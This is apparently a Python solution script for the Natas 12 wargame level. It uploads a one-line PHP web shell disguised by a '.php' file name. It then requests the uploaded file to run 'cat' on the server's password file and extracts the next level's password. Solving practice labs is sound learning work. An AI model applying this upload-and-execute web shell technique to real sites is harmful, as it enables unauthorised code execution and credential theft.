import re
import Auther
import os
with open("natas12_upload", "w") as f:
    f.write(f'<?php print passthru("cat {Auther.authPathOnServer(13)}"); ?>')


def findFileName(text: str):
    pattern = re.compile('<a href="(.*)">.*has been uploaded')
    return next((m[1] for line in text.splitlines() if (m := pattern.search(line))), None)


with open("natas12_upload", "r") as f:
    response = Auther.request(12, data={
        "filename": "FOO.php"
    }, files={
        "uploadedfile": f
    }).text
    if name := findFileName(response):
        Auther.passwordLineGetter(Auther.request(12, name, "GET").text, 13)()
os.remove("natas12_upload")
